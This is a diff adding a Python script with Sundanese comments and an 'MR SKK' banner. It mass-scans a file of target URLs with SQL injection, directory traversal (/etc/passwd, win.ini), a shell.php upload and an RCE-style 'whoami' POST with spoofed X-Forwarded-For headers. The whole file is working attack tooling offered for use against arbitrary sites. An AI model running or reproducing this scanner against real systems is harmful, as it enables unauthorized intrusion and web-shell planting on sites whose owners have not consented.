@@ -1,0 +1,123 @@
+import sys
+import requests
+from colorama import Fore, Style, init
+from concurrent.futures import ThreadPoolExecutor
+
+# Initialize colorama
+init(autoreset=True)
+
+# Banner dengan warna merah
+def banner():
+    print(Fore.RED + r"""
+ ██████   ██████ ███████████       █████████  █████   ████ █████   ████           
+░░██████ ██████ ░░███░░░░░███     ███░░░░░███░░███   ███░ ░░███   ███░            
+ ░███░█████░███  ░███    ░███    ░███    ░░░  ░███  ███    ░███  ███              
+ ░███░░███ ░███  ░██████████     ░░█████████  ░███████     ░███████               
+ ░███ ░░░  ░███  ░███░░░░░███     ░░░░░░░░███ ░███░░███    ░███░░███              
+ ░███      ░███  ░███    ░███     ███    ░███ ░███ ░░███   ░███ ░░███             
+ █████     █████ █████   █████   ░░█████████  █████ ░░████ █████ ░░████           
+░░░░░     ░░░░░ ░░░░░   ░░░░░     ░░░░░░░░░  ░░░░░   ░░░░ ░░░░░   ░░░░            
+    """)
+
+# Fungsi pikeun nyimpen hasil scan ka file log
+def save_to_log(data, filename="scan_results.log"):
+    try:
+        with open(filename, "a") as f:
+            f.write(data + "\n")
+    except Exception as e:
+        print(f"{Fore.RED}[-] Error saving to log: {e}")
+
+# Fungsi pikeun ngecek SQL Injection (SQLi)
+def check_sqli(url):
+    try:
+        payload = "' OR '1'='1"
+        response = requests.get(url + payload, timeout=10)
+        if "error" in response.text.lower():
+            result = f"[+] SQL Injection found at: {url}"
+            print(Fore.GREEN + result)
+            save_to_log(result)  # Simpen ke log
+        else:
+            result = f"[-] No SQL Injection found at: {url}"
+            print(Fore.RED + result)
+            save_to_log(result)
+    except Exception as e:
+        print(f"{Fore.RED}[-] Error checking SQLi for {url}: {e}")
+        save_to_log(f"[-] Error checking SQLi for {url}: {e}")
+
+# Fungsi pikeun ngecek file upload vulnerability
+def test_file_upload(url):
+    try:
+        files = {'file': ('shell.php', open('shell.php', 'rb'), 'application/octet-stream')}
+        response = requests.post(url, files=files, timeout=10)
+        if "success" in response.text.lower():
+            result = f"[+] File upload vulnerability found at: {url}"
+            print(Fore.GREEN + result)
+            save_to_log(result)  # Simpen ke log
+        else:
+            result = f"[-] No file upload vulnerability found at: {url}"
+            print(Fore.RED + result)
+            save_to_log(result)
+    except Exception as e:
+        print(f"{Fore.RED}[-] Error testing file upload for {url}: {e}")
+        save_to_log(f"[-] Error testing file upload for {url}: {e}")
+
+# Fungsi pikeun ngecek directory traversal
+def check_directory_traversal(url):
+    try:
+        payloads = ["../../../../etc/passwd", "../../../../windows/win.ini"]
+        for payload in payloads:
+            response = requests.get(url + payload, timeout=10)
+            if "root:" in response.text or "[fonts]" in response.text:
+                result = f"[+] Directory traversal vulnerability found at: {url}"
+                print(Fore.GREEN + result)
+                save_to_log(result)  # Simpen ke log
+                return
+        result = f"[-] No directory traversal vulnerability found at: {url}"
+        print(Fore.RED + result)
+        save_to_log(result)
+    except Exception as e:
+        print(f"{Fore.RED}[-] Error checking directory traversal for {url}: {e}")
+        save_to_log(f"[-] Error checking directory traversal for {url}: {e}")
+
+# Fungsi pikeun eksploitasi skkxpploit
+def skkxpploit(url, payload):
+    try:
+        headers = {
+            "User-Agent": "Mozilla/5.0",
+            "X-Forwarded-For": "127.0.0.1",
+            "Referer": "https://google.com"
+        }
+        response = requests.post(url, data=payload, headers=headers, timeout=10)
+        if "success" in response.text.lower():
+            result = f"[+] skkxploit successful at: {url}"
+            print(Fore.GREEN + result)
+            save_to_log(result)  # Simpen ke log
+        else:
+            result = f"[-] skkxploit failed at: {url}"
+            print(Fore.RED + result)
+            save_to_log(result)
+    except Exception as e:
+        print(f"{Fore.RED}[-] Error running skkxploit for {url}: {e}")
+        save_to_log(f"[-] Error running skkxploit for {url}: {e}")
+
+# Fungsi pikeun scan target
+def scan_target(target):
+    print(f"{Fore.YELLOW}[*] Scanning: {target}")
+    check_sqli(target)
+    test_file_upload(target)
+    check_directory_traversal(target)
+    skkxpploit(target, payload={"cmd": "whoami"})  # Conto payload RCE
+
+# Fungsi utama
+def main(targets):
+    banner()
+    with ThreadPoolExecutor(max_workers=10) as executor:
+        executor.map(scan_target, targets)
+
+if __name__ == "__main__":
+    try:
+        # Baca daftar target dari file
+        targets = [line.strip() for line in open(sys.argv[1], "r")]
+        main(targets)
+    except Exception as e:
+        print(f"{Fore.RED}[-] Error: {e}")
